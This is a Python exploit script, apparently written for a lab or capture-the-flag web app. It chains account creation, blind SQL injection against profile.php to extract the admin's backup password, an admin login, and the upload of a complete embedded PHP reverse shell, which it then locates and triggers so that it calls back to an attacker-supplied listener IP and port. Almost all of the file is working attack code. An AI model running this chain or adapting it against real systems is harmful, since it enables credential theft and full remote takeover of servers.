#!/usr/bin/env python3

import requests 
import traceback 
import argparse 
from urllib.parse import urljoin
import sys
from datetime import datetime
from zoneinfo import ZoneInfo

PROXY = {"http": "http://127.0.0.1:8080"}

def crtAcc(target):
    """
    Create account and login
    """
    crtAccUrl = urljoin(target, "/pages/sign-up.php")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    username = "johndoe"
    password = "Password!1234"

    crtAccData = {
        "username": username,
        "first_name": "John",
        "last_name": "Doe",
        "email": "john@doe.ltd",
        "password": password,
        "confirm_password": password,
        "remember-me": "on"
    }

    try:
        print("[*] Creating new user account...")
        crtAccRes = requests.post(crtAccUrl, headers=headers, data=crtAccData, allow_redirects=False)

        if crtAccRes.status_code == 302:
            print(f"[+] Account {username}:{password} has been created.")

            # Login
            lgnUrl = urljoin(target, "/pages/sign-in.php")
            lgnData = {"username": username, "password": password, "remember-me": "on", "sign_in": ''}

            try:
                lgnRes = requests.post(lgnUrl, headers=headers, data=lgnData, allow_redirects=False)

                # Use cookies dict instead of parsing headers
                if 'PHPSESSID' in lgnRes.cookies:
                    admin_PHPSESSID_value = lgnRes.cookies['PHPSESSID']
                    print("[+] Logged in successfully")
                    print(f"[+] Cookie: PHPSESSID={admin_PHPSESSID_value}")
                    return admin_PHPSESSID_value
                else:
                    print("[-] Could not extract PHPSESSID from cookies")
                    return None

            except Exception as e:
                print("[-] Error logging in:", e)
                traceback.print_exc()
                return None
        else:
            print(f"[-] Account creation failed, status: {crtAccRes.status_code}")
            return None

    except Exception as e:
        print("[-] Error creating new user account:", e)
        traceback.print_exc()
        return None

def exfil_admin_bkb_password(target, PHPSESSID):
    """
    Determine backup password length
    """
    cookies = {"PHPSESSID": f"{PHPSESSID}"}
    length = 0
    while True:
        length = length + 1
        dtLengthUrl = urljoin(target, f"/pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/IF(LENGTH((SELECT/**/backup_password/**/FROM/**/users/**/WHERE/**/id=1))={length},(SELECT/**/table_name/**/FROM/**/information_schema.tables),'a')),4--")
        dtLengthRes = requests.get(dtLengthUrl, cookies=cookies)
        resLength = len(dtLengthRes.content)
        if resLength > 14800 and resLength < 15000:
            print(f"[+] Admin's backup password length = {length}")
            break
    """
    Exfiltrate the admin's backup_password 
    """
    print("[*] Exfiltrating the admin's backup password...")
    admin_backup_password = ""
    for pos in range(1, int(length) + 1):
        for ascii_code in range(32, 126):
            exfilBkbPassUrl = urljoin(target, f"/pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/IF(ASCII(SUBSTR((SELECT/**/backup_password/**/FROM/**/users/**/WHERE/**/id=1),{pos},1))={ascii_code},(SELECT/**/table_name/**/FROM/**/information_schema.tables),'a')),4--")
            efilPassRes = requests.get(exfilBkbPassUrl, cookies=cookies)
            resLength = len(efilPassRes.content)
            if resLength > 14800 and resLength < 15000:
                admin_backup_password = admin_backup_password + chr(ascii_code)
                sys.stdout.write(chr(ascii_code))
                sys.stdout.flush()
                break
    print(f"\n[+] Admin's backup password: ", admin_backup_password)
    return admin_backup_password

def loginToAdminAcc(target, backup_password):
    lgnUrl = urljoin(target, "/pages/sign-in.php")
    lgnData = {"username": "admin", "password": backup_password, "remember-me": "on", "sign_in": ''}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        lgnRes = requests.post(lgnUrl, headers=headers, data=lgnData, allow_redirects=False)
        # Use cookies dict instead of parsing headers
        if 'PHPSESSID' in lgnRes.cookies:
            admin_PHPSESSID_value = lgnRes.cookies['PHPSESSID']
            print("[+] Logged in to the admin's account successfully")
            print(f"[+] Admin's Cookie: PHPSESSID={admin_PHPSESSID_value}")
            return admin_PHPSESSID_value
        else:
            print("[-] Could not extract the admin's PHPSESSID from cookies")
            return None
    except Exception as e:
        print("[-] Error logging in to the admin's account:", e)
        traceback.print_exc()
        return None

def revShell(target, lhost, lport, admin_PHPSESSID):
    # Get current time in Toronto
    now = datetime.now(ZoneInfo("America/Toronto"))
    """
    Upload reverse shell
    """
    uploadUrl = urljoin(target, "/components/admin/file_storage.php")
    adminCookies = {"PHPSESSID": f"{admin_PHPSESSID}"}
    fileUploadHeaders = {"Content-Type": "multipart/form-data; boundary=---------------------------245500185329964688253137427447"}
    revShelldata = "-----------------------------245500185329964688253137427447\r\nContent-Disposition: form-data; name=\"file\"; filename=\"revshell.php\"\r\nContent-Type: multipart/form-data\r\n\r\n<?php\r\n// php-reverse-shell - A Reverse Shell implementation in PHP\r\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\r\n//\r\n// This tool may be used for legal purposes only.  Users take full responsibility\r\n// for any actions performed using this tool.  The author accepts no liability\r\n// for damage caused by this tool.  If these terms are not acceptable to you, then\r\n// do not use this tool.\r\n//\r\n// In all other respects the GPL version 2 applies:\r\n//\r\n// This program is free software; you can redistribute it and/or modify\r\n// it under the terms of the GNU General Public License version 2 as\r\n// published by the Free Software Foundation.\r\n//\r\n// This program is distributed in the hope that it will be useful,\r\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n// GNU General Public License for more details.\r\n//\r\n// You should have received a copy of the GNU General Public License along\r\n// with this program; if not, write to the Free Software Foundation, Inc.,\r\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\r\n//\r\n// This tool may be used for legal purposes only.  Users take full responsibility\r\n// for any actions performed using this tool.  If these terms are not acceptable to\r\n// you, then do not use this tool.\r\n//\r\n// You are encouraged to send comments, improvements or suggestions to\r\n// me at pentestmonkey@pentestmonkey.net\r\n//\r\n// Description\r\n// -----------\r\n// This script will make an outbound TCP connection to a hardcoded IP and port.\r\n// The recipient will be given a shell running as the current user (apache normally).\r\n//\r\n// Limitations\r\n// -----------\r\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\r\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\r\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\r\n//\r\n// Usage\r\n// -----\r\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\r\n\r\nset_time_limit (0);\r\n$VERSION = \"1.0\";\r\n$ip = '%s';  // CHANGE THIS\r\n$port = %s;       // CHANGE THIS\r\n$chunk_size = 1400;\r\n$write_a = null;\r\n$error_a = null;\r\n$shell = 'uname -a; w; id; /bin/sh -i';\r\n$daemon = 0;\r\n$debug = 0;\r\n\r\n//\r\n// Daemonise ourself if possible to avoid zombies later\r\n//\r\n\r\n// pcntl_fork is hardly ever available, but will allow us to daemonise\r\n// our php process and avoid zombies.  Worth a try...\r\nif (function_exists('pcntl_fork')) {\r\n\t// Fork and have the parent process exit\r\n\t$pid = pcntl_fork();\r\n\t\r\n\tif ($pid == -1) {\r\n\t\tprintit(\"ERROR: Can't fork\");\r\n\t\texit(1);\r\n\t}\r\n\t\r\n\tif ($pid) {\r\n\t\texit(0);  // Parent exits\r\n\t}\r\n\r\n\t// Make the current process a session leader\r\n\t// Will only succeed if we forked\r\n\tif (posix_setsid() == -1) {\r\n\t\tprintit(\"Error: Can't setsid()\");\r\n\t\texit(1);\r\n\t}\r\n\r\n\t$daemon = 1;\r\n} else {\r\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\r\n}\r\n\r\n// Change to a safe directory\r\nchdir(\"/\");\r\n\r\n// Remove any umask we inherited\r\numask(0);\r\n\r\n//\r\n// Do the reverse shell...\r\n//\r\n\r\n// Open reverse connection\r\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\r\nif (!$sock) {\r\n\tprintit(\"$errstr ($errno)\");\r\n\texit(1);\r\n}\r\n\r\n// Spawn shell process\r\n$descriptorspec = array(\r\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\r\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\r\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\r\n);\r\n\r\n$process = proc_open($shell, $descriptorspec, $pipes);\r\n\r\nif (!is_resource($process)) {\r\n\tprintit(\"ERROR: Can't spawn shell\");\r\n\texit(1);\r\n}\r\n\r\n// Set everything to non-blocking\r\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\r\nstream_set_blocking($pipes[0], 0);\r\nstream_set_blocking($pipes[1], 0);\r\nstream_set_blocking($pipes[2], 0);\r\nstream_set_blocking($sock, 0);\r\n\r\nprintit(\"Successfully opened reverse shell to $ip:$port\");\r\n\r\nwhile (1) {\r\n\t// Check for end of TCP connection\r\n\tif (feof($sock)) {\r\n\t\tprintit(\"ERROR: Shell connection terminated\");\r\n\t\tbreak;\r\n\t}\r\n\r\n\t// Check for end of STDOUT\r\n\tif (feof($pipes[1])) {\r\n\t\tprintit(\"ERROR: Shell process terminated\");\r\n\t\tbreak;\r\n\t}\r\n\r\n\t// Wait until a command is end down $sock, or some\r\n\t// command output is available on STDOUT or STDERR\r\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\r\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\r\n\r\n\t// If we can read from the TCP socket, send\r\n\t// data to process's STDIN\r\n\tif (in_array($sock, $read_a)) {\r\n\t\tif ($debug) printit(\"SOCK READ\");\r\n\t\t$input = fread($sock, $chunk_size);\r\n\t\tif ($debug) printit(\"SOCK: $input\");\r\n\t\tfwrite($pipes[0], $input);\r\n\t}\r\n\r\n\t// If we can read from the process's STDOUT\r\n\t// send data down tcp connection\r\n\tif (in_array($pipes[1], $read_a)) {\r\n\t\tif ($debug) printit(\"STDOUT READ\");\r\n\t\t$input = fread($pipes[1], $chunk_size);\r\n\t\tif ($debug) printit(\"STDOUT: $input\");\r\n\t\tfwrite($sock, $input);\r\n\t}\r\n\r\n\t// If we can read from the process's STDERR\r\n\t// send data down tcp connection\r\n\tif (in_array($pipes[2], $read_a)) {\r\n\t\tif ($debug) printit(\"STDERR READ\");\r\n\t\t$input = fread($pipes[2], $chunk_size);\r\n\t\tif ($debug) printit(\"STDERR: $input\");\r\n\t\tfwrite($sock, $input);\r\n\t}\r\n}\r\n\r\nfclose($sock);\r\nfclose($pipes[0]);\r\nfclose($pipes[1]);\r\nfclose($pipes[2]);\r\nproc_close($process);\r\n\r\n// Like print, but does nothing if we've daemonised ourself\r\n// (I can't figure out how to redirect STDOUT like a proper daemon)\r\nfunction printit ($string) {\r\n\tif (!$daemon) {\r\n\t\tprint \"$string\\n\";\r\n\t}\r\n}\r\n\r\n?> \r\n-----------------------------245500185329964688253137427447\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nUpload File\r\n-----------------------------245500185329964688253137427447--\r\n" %(lhost, lport)
    try:
        current_second = now.strftime("%S")
        uploadRevShellRes = requests.post(uploadUrl, headers=fileUploadHeaders, cookies=adminCookies, data=revShelldata)
        if "File not uploaded due to invalid extension." in uploadRevShellRes.text:
            print("[+] Reverse shell uploaded successfully")
            """
            Enumerating the reverse shell file name
            """
            print("[*] Enumerating the reverse shell file name...")
            print("[*] Triggering reverse shell. Please wait...")
            static = now.strftime("%Y-%m-%d_%H-%M")
            found = False
            start = max(0, int(current_second) - 2)
            end = int(current_second) + 2
            for seconds in range(start, end):
                sec_str = f"{seconds:02d}"  # zero-pad to 2 digits
                for rand in range(1,50):
                    revShellUrl = urljoin(target, f"/uploads/1_{static}-{sec_str}_{rand}.php")
                    revShellRes = requests.get(revShellUrl, cookies=adminCookies)
                    print(revShellUrl)
                    if revShellRes.status_code == 404:
                        continue
                    elif revShellRes.status_code == 200:
                        print(f"[+] Reverse Shell File Found at {revShellUrl}")
                        found = True
                        break
                    else:
                        print("[-] Failed to locate the reverse shell file uploaded")
                if found:
                    break

    except Exception as e:
        print("[-] Error uploading the reverse shell file: ", e)
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description="SQLI Exfiltrate Admin's Backup Password. Use it to upload a PHP reverse shell")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help="listener IP address")
    parser.add_argument("lport", help="listener port")
    args = parser.parse_args()

    johnAuthToken = crtAcc(args.target)
    if johnAuthToken:
        adminBackupPassword = exfil_admin_bkb_password(args.target, johnAuthToken)
        if adminBackupPassword:
            adminAuthToken = loginToAdminAcc(args.target, adminBackupPassword)
            if adminAuthToken:
                revShell(args.target, args.lhost, args.lport, adminAuthToken)

if __name__ == "__main__":
    main()
